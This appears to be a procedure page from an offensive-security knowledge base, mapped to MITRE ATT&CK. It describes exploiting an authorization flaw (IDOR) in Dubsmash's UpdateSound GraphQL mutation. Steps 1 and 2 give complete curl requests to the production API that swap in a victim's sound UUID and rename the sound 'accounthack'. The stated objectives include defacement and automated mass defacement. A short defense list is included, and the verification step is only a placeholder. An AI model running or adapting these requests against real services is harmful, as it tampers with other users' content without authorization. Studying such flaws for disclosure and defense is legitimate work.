---
id: proc-replay-updatesound-idor
tags:
  - idor
  - authorization-bypass
  - defacement
  - graphql-mutation
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/curl-update-sound-title]]'
verified: false
platforms:
  - Web
  - Mobile (iOS)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Internal Defacement]]'
updated_at: '2025-12-14T17:29:28.303Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Internal Defacement]]'
---
# Replay-and-Modify-UpdateSound-Mutation-for-IDOR

## Summary

This procedure exploits the lack of ownership validation in Dubsmash's UpdateSound GraphQL mutation, allowing any authenticated user to modify sound titles belonging to others by swapping UUIDs, leading to defacement.

## Description

The UpdateSound mutation accepts a UUID and new name without verifying the authenticated user's ownership, enabling IDOR. Replay captured requests from the app, modify the input, and submit to change titles to malicious content like 'accounthack'. Target environment: GraphQL API over HTTPS. Prerequisites: Valid Bearer token and target UUID from reconnaissance. Expected outcomes: Immediate title update visible in the public sound library, scalable via automation for bulk impact.

## Requirements

1. Valid Bearer token from an authenticated Dubsmash session
2. Target UUID from public query (e.g., via previous procedure)
3. curl for sending modified requests
4. Knowledge of GraphQL mutation syntax

## Defense

Defensive measures and detection strategies:

- Add server-side ownership checks comparing user ID to sound creator
- Log and alert on mutations where user != owner
- Implement input validation and rate limiting on updates

## Objectives

1. Bypass authorization to edit unauthorized sounds
2. Deface titles to disrupt user experience
3. Demonstrate potential for automated mass defacement

## Instructions

### Step 1: Prepare Authenticated Mutation Request

**Context**: Replay the base UpdateSound mutation with your token to ensure it works.

**Command** ([[commands/curl-update-sound-title]] with original UUID):
```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: ' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613158267' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 676' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer XXXXXX' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' -b ' cfduid=' --data-binary '{"query":"mutation UpdateSound($input: UpdateSoundInput!) {\n updateSound(input: $input) {\n** typename\n sound {\n **typename\n ...SoundFragment\n }\n }\n}\n...","variables":{"input":{"uuid":"your-own-uuid","name":"original-name"}}}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

> This tests the mutation; expect a success response with the sound object.

### Step 2: Modify and Execute for Target

**Context**: Change 'uuid' to victim's and 'name' to malicious, then submit.

**Command** ([[commands/curl-update-sound-title]] modified):
```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: ' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613158267' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 676' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer XXXXXX' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' -b ' cfduid=' --data-binary '{"query":"mutation UpdateSound($input: UpdateSoundInput!) {\n updateSound(input: $input) {\n** typename\n sound {\n **typename\n ...SoundFragment\n }\n }\n}\n...","variables":{"input":{"uuid":"a687eb61ad814a09a8a85cedef7837f3","name":"accounthack"}}}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

> The API updates without validation; response includes the defaced sound.

### Step 3: Verify Update

**Context**: Re-query the sound to confirm persistence.

**Command** (Use fetch procedure's command with specific UUID):
```bash
# Adapt fetch command to query by UUID if possible, or check recommendations
```

> Look for the new name in subsequent queries.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Internal Defacement]] Internal Defacement

### Sub-Techniques


## Commands Used

- [[commands/curl-update-sound-title]]

## Tools Used

- [[tools/curl]]

## Tags

- idor
- authorization-bypass
- defacement
- graphql-mutation
